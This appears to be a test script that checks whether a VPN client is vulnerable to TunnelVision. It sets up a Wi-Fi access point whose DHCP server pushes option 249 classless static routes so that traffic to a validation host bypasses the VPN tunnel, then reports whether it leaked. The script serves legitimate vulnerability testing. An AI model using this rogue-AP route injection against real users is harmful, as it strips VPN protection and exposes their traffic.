(*
 * TunnelVision test using DHCP option 249 for classless static routes.
 * Option 249 is the Microsoft variant of DHCP option 121.
 *)

state init begin:
  miscnet = miscnet();
  netmask = "255.255.255.0";
  my_ip = "192.168.137.1";
  target_ip = miscnet.lookup_ipv4("roel.surfcloud.nl");

  miscnet.masquerade("true");

  ap = accesspoint();
  ap.wifi_interface = "wlan0";
  ap.ipv4_addr = my_ip;
  ap.ipv4_netmask = netmask;
  ap.wifi_ssid = "249";
  ap.dhcp4_enable = "true";
  ap.dhcp4_dns = my_ip;
  ap.dhcp4_router = my_ip;
  ap.dhcp4_static_route_option = "249";
  ap.dhcp4_static_route(target_ip, "255.255.255.0", my_ip);
  ap.route_to_default = "true";
  ap.dns_enable = "true";
  ap.bring_up(ap_up, ap_err);

state ap_err:
  exit("failed to bring up access point: ", errstr);

state ap_up:
  mon = trafficmonitor();
  mon.interface = ap.ap_interface;
  mon.validation_server = "https://roel.surfcloud.nl/";
  endpoints = "tcp://ams.nl.eduvpn.org:443;udp://ams.nl.eduvpn.org:443";
  mon.vpn_endpoints = endpoints;
  mon.detect_attack(vpn_safe, vpn_vuln, mon_err);

state mon_err:
  exit("Error occurred: ", errstr);

state vpn_safe:
  exit("Your vpn appears to be safe.");

state vpn_vuln:
  exit("Your vpn appears to be vulnerable to DHCP option 249 routes.");
